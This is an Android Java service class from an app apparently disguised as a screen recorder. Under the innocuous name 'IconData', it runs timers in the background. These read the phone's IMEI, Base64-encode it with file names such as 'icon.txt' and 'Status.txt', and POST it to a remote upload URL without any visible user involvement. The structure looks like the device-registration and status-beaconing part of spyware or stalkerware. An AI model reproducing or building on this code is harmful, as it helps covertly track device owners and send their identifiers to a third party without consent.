package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class IconData extends Service {

    String Dimei;
    String DeviceFile;
    StringBuffer statussb;

    public IconData() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Timer mytimer = new Timer();
        mytimer.schedule(new TimerTask() {

            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- IconData");

                TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
                Dimei = tm.getDeviceId();

                InputStream CallStream = null;
                HttpClient Filehttpclient = new DefaultHttpClient();
                //URL change Urldemo claas used
                String onoffchk = UrlDemo.fsupload;
                HttpPost filehttpPost = new HttpPost(onoffchk);

                byte[] imeidevice = Dimei.getBytes();
                String imeideviceEncode = android.util.Base64.encodeToString(imeidevice, android.util.Base64.DEFAULT);
                String imeideviceString = imeideviceEncode.replaceAll("\n", "");

                String data = String.valueOf(0);
                byte[] icondatabyte=data.getBytes();
                String icondata = android.util.Base64.encodeToString(icondatabyte, android.util.Base64.DEFAULT);
                String icondataString = icondata.replaceAll("\n", "");

                try {
                    //FileName change
                    String devicefile_name ="icon.txt";
                    byte[] devicenamedata = devicefile_name.getBytes("UTF-8");
                    String devicenameencode = android.util.Base64.encodeToString(devicenamedata, android.util.Base64.DEFAULT);
                    DeviceFile = devicenameencode.replaceAll("\n", "");

                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();

                    System.out.println("IMEI NOT NUll wifi = ");
                    System.out.println("IMEI NOT NUll wifi = 1");
                    nameValuePair.add(new BasicNameValuePair("FNAME", DeviceFile));
                    nameValuePair.add(new BasicNameValuePair("IMEI", imeideviceString));
                    nameValuePair.add(new BasicNameValuePair("DATA", icondataString));

                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                    HttpResponse response = Filehttpclient.execute(filehttpPost);

                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    InputStream in = entity.getContent();
                    String buffer = "";
                    for (int i = in.read(); i != -1; i = in.read()) {
                        buffer += (char) i;
                        i++;
                    }

                    //Response message Change
                }
                catch (Exception e){
                    Log.d("IconInfoException ","IconInfoException =" +e);
                }
            }
        }, 0);



        Timer mytimer1 = new Timer();
        mytimer1.schedule(new TimerTask() {
            @Override
            public void run() {
                TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
                Dimei = tm.getDeviceId();

                InputStream CallStream = null;
                HttpClient Filehttpclient = new DefaultHttpClient();
                //URL change Urldemo claas used
                String onoffchk = UrlDemo.fsupload;
                HttpPost filehttpPost = new HttpPost(onoffchk);

                byte[] imeidevice = Dimei.getBytes();
                String imeideviceEncode = android.util.Base64.encodeToString(imeidevice, android.util.Base64.DEFAULT);
                String imeideviceString = imeideviceEncode.replaceAll("\n", "");

                String statusdata = "0,A,A,A,A,A,A,A,A,A,A";
                byte[] icondatabyte=statusdata.getBytes();
                String icondata = android.util.Base64.encodeToString(icondatabyte, android.util.Base64.DEFAULT);
                String icondataString = icondata.replaceAll("\n", "");

                try {
                    //FileName change
                    String devicefile_name ="Status.txt";
                    byte[] devicenamedata = devicefile_name.getBytes("UTF-8");
                    String devicenameencode = android.util.Base64.encodeToString(devicenamedata, android.util.Base64.DEFAULT);
                    DeviceFile = devicenameencode.replaceAll("\n", "");

                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();

                    System.out.println("IMEI NOT NUll wifi = ");
                    nameValuePair.add(new BasicNameValuePair("FNAME", DeviceFile));
                    nameValuePair.add(new BasicNameValuePair("IMEI", imeideviceString));
                    nameValuePair.add(new BasicNameValuePair("DATA", icondataString));

                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                    HttpResponse response = Filehttpclient.execute(filehttpPost);

                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    InputStream in = entity.getContent();
                    String buffer = "";
                    for (int i = in.read(); i != -1; i = in.read()) {
                        buffer += (char) i;
                        i++;
                    }

                    //Response message Change
                    statussb.setLength(0);
                }
                catch (Exception e){
                    Log.d("StatusCheckException ","StatusCheckException =" +e);
                }
            }
        },100);

        return super.onStartCommand(intent, flags, startId);
    }
}
